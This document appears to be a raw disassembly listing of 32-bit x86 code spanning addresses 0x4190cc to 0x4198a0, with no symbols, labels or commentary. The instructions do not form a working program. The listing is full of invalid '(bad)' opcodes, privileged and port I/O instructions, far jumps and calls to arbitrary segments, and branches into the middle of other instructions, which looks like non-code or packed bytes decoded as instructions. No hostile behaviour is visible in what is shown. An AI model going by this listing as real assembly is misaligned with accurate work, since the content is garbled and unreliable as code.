  4190cc:	sub    al,BYTE PTR [esi-0xe691a4e]
  4190d2:	inc    esp
  4190d3:	in     eax,dx
  4190d4:	fisub  WORD PTR [ebp+0x56c31ec6]
  4190da:	xchg   ebp,eax
  4190db:	stc    
  4190dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190dd:	popf   
  4190de:	ret    0xc978
  4190e1:	dec    eax
  4190e2:	mov    WORD PTR es:[edi],fs
  4190e5:	fisttp WORD PTR [edx]
  4190e7:	mov    BYTE PTR [edi+0x1bb4a31b],bl
  4190ed:	into   
  4190ee:	aaa    
  4190ef:	mov    al,ds:0x8fd5a19a
  4190f4:	je     0x419085
  4190f6:	add    ah,BYTE PTR [edx]
  4190f8:	rol    BYTE PTR [esi+0x3ddbfb82],1
  4190fe:	add    al,0x30
  419100:	mov    DWORD PTR [ebx+0x7ba21063],ecx
  419106:	fsubr  DWORD PTR [ecx+edi*1]
  419109:	jo     0x41916f
  41910b:	dec    edx
  41910c:	les    edx,FWORD PTR [edx]
  41910e:	push   ebx
  41910f:	jae    0x4190ac
  419111:	adc    ah,BYTE PTR [ecx]
  419113:	rcl    BYTE PTR [ebp-0x280f1c7f],0x70
  41911a:	xchg   esi,eax
  41911b:	pop    ebp
  41911c:	(bad)  
  41911d:	(bad)  [ebx+eax*2+0x36bb5bd7]
  419124:	cmp    BYTE PTR [eax+0x71],dl
  419127:	cld    
  419128:	and    DWORD PTR [edi],0xffffff9a
  41912b:	pop    ebp
  41912c:	ss out 0x34,al
  41912f:	and    BYTE PTR [edx],dl
  419131:	adc    al,0x43
  419133:	stc    
  419134:	pop    ebx
  419135:	push   edi
  419136:	jnp    0x4191b2
  419138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419139:	jo     0x41917d
  41913b:	cmp    eax,0x71ac103d
  419140:	ins    BYTE PTR es:[edi],dx
  419141:	jno    0x419100
  419143:	repz xlat BYTE PTR ds:[ebx]
  419145:	jmp    0x419141
  419147:	adc    DWORD PTR [esi-0x7a],edx
  41914a:	jbe    0x4191bd
  41914c:	imul   eax,DWORD PTR [eax-0x11],0x68
  419150:	push   0x3f
  419152:	jo     0x41912c
  419154:	lods   al,BYTE PTR ds:[esi]
  419155:	pop    esp
  419156:	test   al,0xab
  419158:	pop    ecx
  419159:	dec    ecx
  41915a:	or     dl,BYTE PTR [edi]
  41915c:	cld    
  41915d:	and    BYTE PTR [esi-0xf],bl
  419160:	xchg   ebp,eax
  419161:	inc    ebp
  419162:	pop    edx
  419163:	or     eax,0x823814b6
  419168:	mov    ah,BYTE PTR [esi+0x2c]
  41916b:	sbb    eax,0x6c0d679d
  419170:	mov    dh,0x2b
  419172:	sub    al,0x63
  419174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419175:	inc    eax
  419176:	inc    ecx
  419177:	push   esp
  419178:	bound  edx,QWORD PTR [ecx-0x68c399e8]
  41917e:	pusha  
  41917f:	cwde   
  419180:	ins    BYTE PTR es:[edi],dx
  419181:	out    dx,al
  419182:	push   edi
  419183:	jne    0x4191c3
  419185:	jbe    0x4191b8
  419187:	int3   
  419188:	in     al,0xd0
  41918a:	outs   dx,BYTE PTR ds:[esi]
  41918b:	sbb    esi,DWORD PTR [ebx+0x67349e20]
  419191:	adc    esi,DWORD PTR [esi-0x5d]
  419194:	pop    esi
  419195:	jmp    0x585f:0xed074492
  41919c:	mov    edi,0xc10e7205
  4191a1:	pop    ecx
  4191a2:	sub    edx,ebp
  4191a4:	mov    ah,dl
  4191a6:	leave  
  4191a7:	jae    0x419162
  4191a9:	pop    esi
  4191aa:	mov    ecx,0xa014084e
  4191af:	mov    al,ds:0xa839eb4a
  4191b4:	sbb    esp,DWORD PTR [edi+0x782f9996]
  4191ba:	mov    edx,0x6477b568
  4191bf:	jg     0x4191f8
  4191c1:	sbb    edi,DWORD PTR [ecx]
  4191c3:	mov    bh,0x4f
  4191c5:	pop    edi
  4191c6:	fild   WORD PTR [eax-0x5d]
  4191c9:	aas    
  4191ca:	xchg   DWORD PTR [ebx],eax
  4191cc:	jb     0x419222
  4191ce:	inc    esp
  4191cf:	inc    esi
  4191d0:	pushf  
  4191d1:	test   edi,esp
  4191d3:	jo     0x4191a7
  4191d5:	adc    eax,0x7863174c
  4191da:	lods   al,BYTE PTR ds:[esi]
  4191db:	add    BYTE PTR [eax+0x281d660c],dh
  4191e1:	cmp    ebx,DWORD PTR [eax]
  4191e3:	enter  0x5742,0xbe
  4191e7:	mov    al,0x34
  4191e9:	sbb    eax,0x39c14be9
  4191ee:	imul   edx,DWORD PTR [edi],0x2e8fc839
  4191f4:	jecxz  0x419219
  4191f6:	mov    bh,0x1d
  4191f8:	xor    eax,0xfd43acb4
  4191fd:	pop    esp
  4191fe:	add    al,0x4c
  419200:	loopne 0x4191e5
  419202:	and    DWORD PTR [edx+0x804626b],ecx
  419208:	sbb    DWORD PTR [eax+0x7bdf6ce6],esi
  41920e:	outs   dx,BYTE PTR ds:[esi]
  41920f:	mov    dh,0xbf
  419211:	jle    0x419254
  419213:	sub    DWORD PTR [edi],edi
  419215:	jecxz  0x4191f2
  419217:	jg     0x41922c
  419219:	sub    eax,0x9db87c71
  41921e:	add    al,BYTE PTR [eax]
  419220:	hlt    
  419221:	js     0x41927a
  419223:	xor    eax,DWORD PTR [edi+0x139fe554]
  419229:	je     0x419220
  41922b:	int    0x6c
  41922d:	xchg   edi,eax
  41922e:	lods   al,BYTE PTR ds:[esi]
  41922f:	inc    edi
  419230:	js     0x419287
  419232:	loop   0x4192a2
  419234:	adc    DWORD PTR [ebx+eax*8],esp
  419237:	add    DWORD PTR [ecx-0x5e217c7c],edx
  41923d:	and    al,bl
  41923f:	leave  
  419240:	pop    ebp
  419241:	mov    cl,0xac
  419243:	std    
  419244:	mov    esi,0x9c08ebe2
  419249:	xor    DWORD PTR ss:[ebp+0x48bec1de],0x9a0772b1
  419254:	(bad)  
  419255:	ss ret 
  419257:	ret    0xd94
  41925a:	(bad)  
  41925b:	cmp    DWORD PTR ds:[ebp+0x33],edi
  41925f:	xor    BYTE PTR [ecx-0x45],dh
  419262:	test   DWORD PTR [ecx+0x5c],eax
  419265:	adc    cl,bh
  419267:	push   ebp
  419268:	repnz mov ebx,0x5aac02
  41926e:	pop    esi
  41926f:	mov    esi,0x7eed100b
  419274:	rol    dl,cl
  419276:	fwait
  419277:	mov    eax,cs:0x8ad38874
  41927d:	fld    DWORD PTR [ebx+ebx*1+0x2]
  419281:	ins    DWORD PTR es:[edi],dx
  419282:	push   0x1a
  419284:	or     DWORD PTR [ecx-0x22],edi
  419287:	xor    BYTE PTR [edx-0x13],dl
  41928a:	(bad)  
  41928b:	jmp    0xcc0f:0x8f47a034
  419292:	and    BYTE PTR [ecx+edi*8],dl
  419295:	jecxz  0x419271
  419297:	mov    ah,0x49
  419299:	xchg   BYTE PTR [esi],dh
  41929b:	sbb    bl,BYTE PTR [edi]
  41929d:	adc    eax,0x2c57f2ec
  4192a2:	dec    esp
  4192a3:	scas   al,BYTE PTR es:[edi]
  4192a4:	add    BYTE PTR [edx+0x3c90d8f8],0x5b
  4192ab:	mov    edx,0x3ea3efc5
  4192b0:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4192b2:	dec    edi
  4192b3:	rcl    cl,1
  4192b5:	mov    edi,0xbc901756
  4192ba:	lods   eax,DWORD PTR ds:[esi]
  4192bb:	dec    esp
  4192bc:	sub    BYTE PTR [esi-0x1],0xc0
  4192c0:	add    eax,0xc41c4e49
  4192c5:	jmp    0xbb845a67
  4192ca:	pop    esp
  4192cb:	rcr    DWORD PTR [edx-0x5b],0xdc
  4192cf:	icebp  
  4192d0:	fisub  WORD PTR [esi]
  4192d2:	jbe    0x41927a
  4192d4:	into   
  4192d5:	xchg   DWORD PTR [ebx],ecx
  4192d7:	pop    es
  4192d8:	fidivr WORD PTR [ecx]
  4192da:	outs   dx,DWORD PTR ds:[esi]
  4192db:	mov    al,BYTE PTR [ecx]
  4192dd:	test   DWORD PTR [edi-0x20ce33cc],ebx
  4192e3:	xchg   dh,dl
  4192e5:	inc    edx
  4192e6:	jmp    0xf9ae3e17
  4192eb:	add    eax,0x5ee19d0f
  4192f0:	js     0x41936a
  4192f2:	push   ss
  4192f3:	lods   eax,DWORD PTR ds:[esi]
  4192f4:	or     al,0xb8
  4192f6:	mov    BYTE PTR [edx+0x2a],dl
  4192f9:	call   0xb3a2:0xbcb04d0
  419300:	popf   
  419301:	(bad)  
  419302:	lock je 0x41936d
  419305:	dec    esp
  419306:	mov    al,ds:0xd53d7935
  41930b:	std    
  41930c:	neg    BYTE PTR [ebx]
  41930e:	bound  ebp,QWORD PTR [eax]
  419310:	das    
  419311:	cli    
  419312:	inc    eax
  419313:	test   DWORD PTR [ebx+0xd],eax
  419316:	or     DWORD PTR [esi],0x9
  419319:	call   0xfe9ce4ff
  41931e:	lock inc edx
  419320:	pushf  
  419321:	pop    eax
  419322:	xchg   ecx,eax
  419323:	mov    ds:0xf5d3e8d,eax
  419328:	dec    ecx
  419329:	ja     0x419391
  41932b:	popf   
  41932c:	arpl   WORD PTR ds:[edi],cx
  41932f:	cld    
  419330:	mov    ds:0x45d0926,al
  419335:	pushf  
  419336:	hlt    
  419337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419338:	mov    al,0x58
  41933a:	daa    
  41933b:	lea    ecx,[ebp-0x1]
  41933e:	jo     0x41933b
  419340:	aas    
  419341:	sub    edx,0xccdf79b0
  419347:	bound  eax,QWORD PTR [esi]
  419349:	mov    ss,WORD PTR [edx]
  41934b:	add    DWORD PTR [ebx-0x36],ebx
  41934e:	in     al,0x45
  419350:	push   ebp
  419351:	mov    ?,ebp
  419353:	cwde   
  419354:	pop    ebp
  419355:	ror    BYTE PTR [edi+0x5a56ecc5],0x87
  41935c:	mul    DWORD PTR [ecx+esi*2]
  41935f:	lods   eax,DWORD PTR ds:[esi]
  419360:	aad    0x7
  419362:	repz sub BYTE PTR [ebx-0x578e7e22],0x2a
  41936a:	leave  
  41936b:	dec    eax
  41936c:	and    DWORD PTR ds:0x2cca7c,edx
  419372:	in     eax,0xf
  419374:	push   ecx
  419375:	ja     0x4193da
  419377:	mov    cl,0xb3
  419379:	mov    ah,0xb3
  41937b:	test   BYTE PTR [ebx+0x62d6d480],ah
  419381:	arpl   WORD PTR [edx+ebx*2],bx
  419384:	stc    
  419385:	ins    DWORD PTR es:[edi],dx
  419386:	pop    ebx
  419387:	mov    bl,0xc4
  419389:	xor    dh,BYTE PTR [eax+0x62]
  41938c:	push   ds
  41938d:	add    BYTE PTR [ebp-0x46],0x48
  419391:	sub    ah,bh
  419393:	mov    edi,0x64223d91
  419398:	mov    esi,0xdb43358e
  41939d:	lock or ecx,edx
  4193a0:	cmp    DWORD PTR [esi+0x0],ebx
  4193a3:	and    DWORD PTR [ebx-0x29],esi
  4193a6:	mov    eax,ds:0x41e56686
  4193ab:	mov    WORD PTR [edi+0x3],es
  4193ae:	push   eax
  4193af:	fsub   QWORD PTR [edx+0x8804948]
  4193b5:	push   esp
  4193b6:	push   ds
  4193b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193b8:	pop    ecx
  4193b9:	mov    dl,0xf6
  4193bb:	xor    edi,DWORD PTR [eax+0xf]
  4193be:	xchg   edx,eax
  4193bf:	mov    ebp,0x8ea643c6
  4193c4:	(bad)  
  4193c5:	mov    gs,WORD PTR [edx]
  4193c7:	daa    
  4193c8:	lea    esp,[ebx-0x73]
  4193cb:	ins    BYTE PTR es:[edi],dx
  4193cc:	test   al,0x22
  4193ce:	dec    esi
  4193cf:	xchg   edi,eax
  4193d0:	cmp    bh,bl
  4193d2:	mov    cl,0x6
  4193d4:	je     0x419429
  4193d6:	sbb    DWORD PTR [ebp+edx*1+0x5bffe560],0x74ce7af5
  4193e1:	push   0x4e74682f
  4193e6:	fs inc esp
  4193e8:	jecxz  0x419432
  4193ea:	repnz mov edi,0xe456ff7c
  4193f0:	test   eax,0x90a526d8
  4193f5:	sub    eax,0x443201a4
  4193fa:	mov    al,ds:0x71663550
  4193ff:	imul   eax,DWORD PTR [bp+di-0x1],0xffffff84
  419404:	mov    BYTE PTR [esi+0x4c8325fb],0x94
  41940b:	push   ss
  41940c:	jle    0x4193ce
  41940e:	add    eax,0x9d7a88cc
  419413:	jle    0x41946a
  419415:	mov    al,ds:0x1e7870c2
  41941a:	ficom  WORD PTR [esi]
  41941c:	cs adc al,0x53
  41941f:	out    dx,al
  419420:	adc    al,0xf3
  419422:	stc    
  419423:	and    BYTE PTR [esi+eax*8],al
  419426:	sbb    dl,BYTE PTR [edx]
  419428:	push   edx
  419429:	retf   
  41942a:	shr    DWORD PTR [edi],1
  41942c:	call   0x59a83282
  419431:	sbb    DWORD PTR [edx+0x7d998361],eax
  419437:	sbb    BYTE PTR [esi-0x2abfb64c],dh
  41943d:	mov    edi,DWORD PTR [ebx]
  41943f:	xchg   ebx,eax
  419440:	inc    edi
  419441:	mov    ebx,0x1cc9f242
  419446:	sub    ebp,DWORD PTR [ebx+eax*4-0x383a4d6e]
  41944d:	rcr    dl,cl
  41944f:	adc    edi,DWORD PTR [ebx-0x23]
  419452:	jb     0x4193fc
  419454:	cmp    esp,DWORD PTR [ebp+0x67599fd5]
  41945a:	add    bh,BYTE PTR [edi+0x2709c651]
  419460:	pop    edi
  419461:	add    BYTE PTR [edi+0x47],ch
  419464:	ins    DWORD PTR es:[edi],dx
  419465:	mov    edi,0x50dc0546
  41946a:	mov    ecx,0x7bf1ca13
  41946f:	gs jne 0x41942e
  419472:	dec    edi
  419473:	jo     0x4194e4
  419475:	in     eax,dx
  419476:	pop    ebp
  419477:	mov    edi,0xa19e8ecc
  41947c:	fwait
  41947d:	mov    al,0x49
  41947f:	sbb    BYTE PTR [edi-0x27],cl
  419482:	sub    BYTE PTR [edi],ch
  419484:	add    BYTE PTR [esi+0x4211e013],0xf4
  41948b:	inc    esi
  41948c:	daa    
  41948d:	mov    cl,0x1d
  41948f:	jl     0x419429
  419491:	push   ebx
  419492:	(bad)  
  419493:	pop    edi
  419494:	pop    ecx
  419495:	xor    eax,0x9ee87861
  41949a:	cmp    al,0x9f
  41949c:	stos   BYTE PTR es:[edi],al
  41949d:	mov    BYTE PTR [ebx-0x4be71186],bh
  4194a3:	aaa    
  4194a4:	pop    esi
  4194a5:	xchg   edx,eax
  4194a6:	pop    edx
  4194a7:	js     0x419474
  4194a9:	adc    bh,al
  4194ab:	clc    
  4194ac:	adc    al,BYTE PTR [esi+esi*4+0x2f]
  4194b0:	(bad)  
  4194b1:	leave  
  4194b2:	sub    al,0xf5
  4194b4:	xchg   cl,dl
  4194b6:	jge    0x4194ff
  4194b8:	pop    esp
  4194b9:	xchg   ebx,eax
  4194ba:	mov    ah,al
  4194bc:	push   ds
  4194bd:	nop
  4194be:	pop    edi
  4194bf:	adc    eax,0x62d63bfd
  4194c4:	adc    bl,BYTE PTR cs:[eax-0x63583569]
  4194cb:	xor    ebx,ebx
  4194cd:	xchg   edi,eax
  4194ce:	stos   BYTE PTR es:[edi],al
  4194cf:	mov    eax,0xcb361f5b
  4194d4:	push   esi
  4194d5:	sar    BYTE PTR [esi+0x68],0x32
  4194d9:	pop    ecx
  4194da:	or     esp,ebp
  4194dc:	dec    ebp
  4194dd:	add    ecx,ebx
  4194df:	adc    DWORD PTR [ecx+0x4b8b7fb7],ebx
  4194e5:	fnsave [esi+esi*2-0x4ae3ffb7]
  4194ec:	xlat   BYTE PTR ds:[ebx]
  4194ed:	pushf  
  4194ee:	stos   DWORD PTR es:[edi],eax
  4194ef:	test   DWORD PTR [edx+eiz*8-0x4dcf6e7c],ebp
  4194f6:	xor    DWORD PTR [eax-0x45],esp
  4194f9:	xchg   edx,eax
  4194fa:	jo     0x419529
  4194fc:	add    DWORD PTR [esi+ebp*2-0x12501e5a],0xffffffd6
  419504:	fcomi  st,st(6)
  419506:	nop
  419507:	pop    ecx
  419508:	cmp    al,0xe7
  41950a:	jnp    0x4194b2
  41950c:	mov    edi,0x4d27c7f2
  419511:	mov    ebp,esp
  419513:	sbb    DWORD PTR ds:0xf57fd6c,0xffffffa2
  41951a:	adc    eax,0x83550726
  41951f:	es dec edi
  419521:	inc    ebx
  419522:	add    al,0xf9
  419524:	(bad)  
  419525:	std    
  419526:	push   es
  419527:	mov    DWORD PTR [eax+edi*4],0x4c19cd1a
  41952e:	ret    
  41952f:	xor    DWORD PTR [ecx-0x4af88fd7],ecx
  419535:	jp     0x4195b1
  419537:	mov    al,0x51
  419539:	sti    
  41953a:	stos   BYTE PTR es:[edi],al
  41953b:	jo     0x41954c
  41953d:	and    ch,BYTE PTR [edi-0x6c012720]
  419543:	mov    al,0x69
  419545:	inc    edx
  419546:	push   edx
  419547:	xchg   ebx,eax
  419548:	push   0xffffff9a
  41954a:	and    ebx,0xf8e8c192
  419550:	xor    al,0xbf
  419552:	add    eax,0x3bfe039f
  419557:	jl     0x41954a
  419559:	aam    0xa2
  41955b:	cld    
  41955c:	dec    eax
  41955d:	xor    bl,BYTE PTR [esp+ecx*8-0x5c]
  419561:	cmp    eax,0x14fc8d6a
  419566:	xchg   ebx,eax
  419567:	jg     0x4195b2
  419569:	js     0x4195d7
  41956b:	mov    bh,0x6f
  41956d:	pop    ebp
  41956e:	nop
  41956f:	pop    edi
  419570:	xor    DWORD PTR [esi+0x4293d96],edx
  419576:	pop    es
  419577:	shl    BYTE PTR [ebp-0x54],0x12
  41957b:	in     al,0xac
  41957d:	push   cs
  41957e:	pop    edi
  41957f:	rol    BYTE PTR [eax+0x40adcd92],cl
  419585:	jno    0x419555
  419587:	(bad)  
  419588:	push   edi
  419589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41958a:	mov    al,0x6f
  41958c:	mov    edi,0xcf225dd6
  419591:	push   ebx
  419592:	test   DWORD PTR [ebp+ebx*1-0x10],ebp
  419596:	daa    
  419597:	mov    ch,0x64
  419599:	cmp    bh,BYTE PTR [edx]
  41959b:	push   esp
  41959c:	(bad)  
  41959d:	loopne 0x41955d
  41959f:	aaa    
  4195a0:	pusha  
  4195a1:	loop   0x4195e6
  4195a3:	mov    ds:0x942b23f,eax
  4195a8:	sar    ebp,0x90
  4195ab:	mov    ebp,0x50e0705a
  4195b0:	clc    
  4195b1:	xchg   ecx,eax
  4195b2:	push   0xd04d9566
  4195b7:	imul   eax,ebx,0xffffff8a
  4195ba:	mov    dl,0xd6
  4195bc:	daa    
  4195bd:	stos   BYTE PTR es:[edi],al
  4195be:	test   al,0x73
  4195c0:	cmp    BYTE PTR [ebp-0x2f58f02b],ch
  4195c6:	mov    dl,0x12
  4195c8:	aas    
  4195c9:	out    0x98,al
  4195cb:	popf   
  4195cc:	imul   eax,esp,0xf050a323
  4195d2:	inc    ecx
  4195d3:	cmc    
  4195d4:	add    esp,DWORD PTR [eax+0x50]
  4195d7:	dec    ebx
  4195d8:	or     edx,DWORD PTR [esi-0x49]
  4195db:	shl    ecx,0x49
  4195de:	ins    DWORD PTR es:[edi],dx
  4195df:	shr    bh,cl
  4195e1:	lahf   
  4195e2:	aad    0x1c
  4195e4:	adc    edx,DWORD PTR [ecx-0x5f]
  4195e7:	shl    dl,1
  4195e9:	jge    0x419609
  4195eb:	std    
  4195ec:	cmc    
  4195ed:	pop    edi
  4195ee:	sbb    DWORD PTR [ebx-0x5c],0xfb049ab6
  4195f5:	and    ebp,ebp
  4195f7:	(bad)  
  4195f8:	fdivrp st(1),st
  4195fa:	mov    ch,0x31
  4195fc:	pop    es
  4195fd:	int    0xe5
  4195ff:	cld    
  419600:	repnz rcl DWORD PTR ds:[ebx+0x2534b28b],1
  419608:	mov    ebp,0x321682ab
  41960d:	imul   esi,DWORD PTR [ebx+edi*2+0x1f],0x2e614304
  419615:	lock mov ecx,0x8eacf230
  41961b:	invd   
  41961d:	shl    BYTE PTR [edi],cl
  41961f:	adc    al,0xe8
  419621:	sbb    al,0x44
  419623:	mov    dl,0x4b
  419625:	fwait
  419626:	jl     0x4195ed
  419628:	pop    ss
  419629:	cmp    bh,ah
  41962b:	mov    ds:0x59a9b3cb,al
  419630:	in     al,0x5a
  419632:	and    cl,BYTE PTR ss:[esi+ecx*4-0x6b]
  419637:	sahf   
  419638:	aaa    
  419639:	das    
  41963a:	add    DWORD PTR [ecx],0x1f63a6ba
  419640:	and    ch,BYTE PTR [ebx-0x4f]
  419643:	mov    al,ds:0x35ef8378
  419648:	lds    eax,FWORD PTR [eax]
  41964a:	fbstp  TBYTE PTR [ecx+0x11]
  41964d:	and    esp,esi
  41964f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419650:	lods   al,BYTE PTR ds:[esi]
  419651:	lods   eax,DWORD PTR ds:[esi]
  419652:	stc    
  419653:	jns    0x4196ab
  419655:	inc    ebx
  419656:	sub    edi,DWORD PTR [esi-0x6b]
  419659:	push   cs
  41965a:	pop    ds
  41965b:	xchg   ebp,eax
  41965c:	popf   
  41965d:	rcl    DWORD PTR [edx+edx*2-0x2b],cl
  419661:	xor    BYTE PTR [eax],dh
  419663:	push   esp
  419664:	mov    ebp,0x408188e6
  419669:	pop    esp
  41966a:	adc    DWORD PTR [edx-0x5b007554],edx
  419670:	push   0x7d
  419672:	enter  0x9109,0x50
  419676:	sub    eax,0x76af196b
  41967b:	sar    BYTE PTR [esi-0x5d],0xa
  41967f:	sub    eax,0x468e1ae
  419684:	lock add BYTE PTR [ebp-0x5a],al
  419688:	in     al,0xff
  41968a:	and    eax,0xbbd7fbf6
  41968f:	in     eax,dx
  419690:	out    0x76,al
  419692:	int    0x7b
  419694:	push   edx
  419695:	scas   al,BYTE PTR es:[edi]
  419696:	xchg   esp,eax
  419697:	xchg   ebp,eax
  419698:	test   edx,edi
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	cld    
  41969d:	sub    edi,DWORD PTR [ecx+ebx*2]
  4196a0:	out    0x66,al
  4196a2:	cwde   
  4196a3:	jno    0x41971c
  4196a5:	fs mov ecx,0xf577d8c7
  4196ab:	xchg   ebp,eax
  4196ac:	lds    esp,FWORD PTR [eax-0x7abb6d18]
  4196b2:	popf   
  4196b3:	xor    DWORD PTR [esi+0x17],edx
  4196b6:	sti    
  4196b7:	out    0x25,al
  4196b9:	and    DWORD PTR [edi],0xffffffd0
  4196bc:	push   ebx
  4196bd:	stos   BYTE PTR es:[edi],al
  4196be:	mov    ah,0x4b
  4196c0:	mov    ebp,esp
  4196c2:	sub    eax,0x68d04708
  4196c7:	xor    BYTE PTR [eax+0xd],0x93
  4196cb:	test   al,0xee
  4196cd:	fisub  WORD PTR [ebx+0x73]
  4196d0:	stc    
  4196d1:	das    
  4196d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196d3:	loop   0x4196c0
  4196d5:	xor    BYTE PTR [edi+0x48],ah
  4196d8:	stos   BYTE PTR es:[edi],al
  4196d9:	push   0x1549ad5
  4196de:	test   al,0xae
  4196e0:	das    
  4196e1:	in     eax,dx
  4196e2:	mov    ds:0x54585456,al
  4196e7:	jmp    0x83cf43e3
  4196ec:	hlt    
  4196ed:	push   edi
  4196ee:	out    0x90,eax
  4196f0:	sahf   
  4196f1:	div    esp
  4196f3:	aad    0x9e
  4196f5:	fs loope 0x41970f
  4196f8:	mov    dh,0xbd
  4196fa:	aaa    
  4196fb:	inc    edi
  4196fc:	cmp    al,0xe7
  4196fe:	push   edi
  4196ff:	mov    eax,ds:0xeea4f0aa
  419704:	mov    ebp,0xd5fa89e0
  419709:	rol    al,1
  41970b:	mov    ecx,DWORD PTR [ecx]
  41970d:	xor    BYTE PTR [esi+0x4],dh
  419710:	mov    ds:0x8a0a0e2c,eax
  419715:	xchg   edi,eax
  419716:	dec    ebx
  419717:	and    ah,cl
  419719:	push   edx
  41971a:	mov    ds:0x275bed93,al
  41971f:	pop    esi
  419720:	cmp    ah,BYTE PTR [ecx-0x12fca939]
  419726:	jae    0x4196c4
  419728:	cmp    ch,cl
  41972a:	cdq    
  41972b:	ret    0x4be7
  41972e:	pop    esp
  41972f:	dec    eax
  419730:	mov    ebx,0x34f6dd92
  419735:	loopne 0x41978f
  419737:	sbb    bh,bh
  419739:	into   
  41973a:	rol    BYTE PTR ss:[eax-0x1fa6504c],cl
  419741:	fstp   TBYTE PTR [edx-0x6aae0a64]
  419747:	push   edi
  419748:	mov    ds:0x60f8bd6c,eax
  41974d:	push   edx
  41974e:	std    
  41974f:	ds dec ebp
  419751:	push   ss
  419752:	inc    ebp
  419753:	icebp  
  419754:	add    eax,0x94128b46
  419759:	mov    bl,0xdc
  41975b:	mov    esp,0x394c403c
  419760:	add    eax,esp
  419762:	and    bl,BYTE PTR [edi+0x35]
  419765:	inc    esi
  419766:	jge    0x41974b
  419768:	lds    ebp,FWORD PTR [esi]
  41976a:	jbe    0x4197da
  41976c:	shl    DWORD PTR [edx],1
  41976e:	loop   0x41970e
  419770:	out    dx,al
  419771:	add    cl,dl
  419773:	call   DWORD PTR [edi+0x2bd27604]
  419779:	jmp    0xa7354dd4
  41977e:	loope  0x41970a
  419780:	(bad)  
  419781:	xchg   edi,eax
  419782:	(bad)  
  419783:	or     eax,0xf04eb2c
  419788:	and    eax,eax
  41978a:	cmp    eax,0x5d8de18d
  41978f:	es jae 0x4197d2
  419792:	mov    esi,0x194ca8e3
  419797:	jl     0x4197ba
  419799:	push   ecx
  41979a:	out    dx,eax
  41979b:	or     ecx,ebp
  41979d:	xlat   BYTE PTR ds:[ebx]
  41979e:	and    al,0xb0
  4197a0:	jb     0x4197e9
  4197a2:	mov    bh,0x90
  4197a4:	mov    esp,0x587ee46
  4197a9:	sub    al,0xad
  4197ab:	pop    ecx
  4197ac:	xchg   esp,eax
  4197ad:	push   edx
  4197ae:	push   ss
  4197af:	ja     0x4197af
  4197b1:	cmp    DWORD PTR [ebp-0x14],edi
  4197b4:	push   es
  4197b5:	jp     0x419746
  4197b7:	hlt    
  4197b8:	dec    ebp
  4197b9:	ins    BYTE PTR es:[edi],dx
  4197ba:	je     0x419792
  4197bc:	xchg   edi,eax
  4197bd:	stos   DWORD PTR es:[edi],eax
  4197be:	test   al,0xab
  4197c0:	sub    BYTE PTR [esp+esi*4+0x105fffae],bh
  4197c7:	retf   
  4197c8:	fwait
  4197c9:	mov    ch,0x7d
  4197cb:	in     al,dx
  4197cc:	dec    ebx
  4197cd:	shr    dl,1
  4197cf:	xor    BYTE PTR [eax-0x7c],bh
  4197d2:	stos   BYTE PTR es:[edi],al
  4197d3:	pop    esi
  4197d4:	dec    edx
  4197d5:	dec    ecx
  4197d6:	push   es
  4197d7:	(bad)  
  4197d8:	in     al,0x4
  4197da:	push   ecx
  4197db:	xchg   ecx,eax
  4197dc:	jg     0x4197c2
  4197de:	xor    BYTE PTR [esp+ebx*1],bh
  4197e1:	mov    ecx,0xc9650475
  4197e6:	int    0x44
  4197e8:	jl     0x41980e
  4197ea:	repz fisubr DWORD PTR [ecx+eax*8-0x19cbf752]
  4197f2:	sar    DWORD PTR [edx],cl
  4197f4:	scas   al,BYTE PTR es:[edi]
  4197f5:	push   0xd7faf7a3
  4197fa:	push   ds
  4197fb:	push   0x20
  4197fd:	cmp    DWORD PTR [ebp+0x791ddd05],ebp
  419803:	adc    eax,edx
  419805:	mov    edi,0x6cd95335
  41980a:	adc    eax,edi
  41980c:	adc    DWORD PTR [edi-0x7e],0x36dabed0
  419813:	in     eax,dx
  419814:	stos   BYTE PTR es:[edi],al
  419815:	(bad)  [ebx+0x44bf3ac3]
  41981b:	jnp    0x4197cf
  41981d:	mov    ch,0x1a
  41981f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419820:	out    dx,eax
  419821:	test   al,0xd3
  419823:	mov    esi,0x70a98abf
  419828:	scas   eax,DWORD PTR es:[edi]
  419829:	outs   dx,BYTE PTR ds:[esi]
  41982a:	loope  0x41985b
  41982c:	aaa    
  41982d:	adc    BYTE PTR [esi],dl
  41982f:	sub    eax,0x9e378832
  419834:	sub    dh,bl
  419836:	cld    
  419837:	push   ecx
  419838:	or     al,0x3f
  41983a:	sub    DWORD PTR [ebp-0x503ef8df],ecx
  419840:	scas   al,BYTE PTR es:[edi]
  419841:	add    BYTE PTR [edx+0x76],bl
  419844:	or     cl,cl
  419846:	mov    dh,0x93
  419848:	or     ecx,edx
  41984a:	and    edi,DWORD PTR [ecx]
  41984c:	icebp  
  41984d:	sti    
  41984e:	cld    
  41984f:	lods   al,BYTE PTR ds:[esi]
  419850:	mov    esi,0x51ecb73f
  419855:	gs push 0x7aad95c3
  41985b:	mov    cl,0xa5
  41985d:	push   ss
  41985e:	push   cs
  41985f:	xchg   ebp,eax
  419860:	lods   eax,DWORD PTR ds:[esi]
  419861:	sub    BYTE PTR fs:[edi+0x7d2c7ff3],ch
  419868:	sub    al,0x69
  41986a:	shl    BYTE PTR [esi-0x1f],cl
  41986d:	add    DWORD PTR [edx],esp
  41986f:	adc    esi,ebx
  419871:	sub    ecx,DWORD PTR [ebx+0x64]
  419874:	jo     0x419803
  419876:	or     DWORD PTR [eax-0x17c5ba82],ebx
  41987c:	jns    0x419840
  41987e:	mov    cl,0xc3
  419880:	push   0xf58cc8d8
  419885:	mov    ch,ah
  419887:	jno    0x419855
  419889:	test   al,0xdf
  41988b:	cdq    
  41988c:	(bad)  
  41988e:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419890:	pop    ebx
  419891:	mov    esp,0x3daeb414
  419896:	adc    al,0xba
  419898:	(bad)  
  419899:	mov    al,ds:0xe03de617
  41989e:	(bad)  
  41989f:	out    dx,al
  4198a0:	sub    edx,DWORD PTR [edi-0x7bdbf1f9]
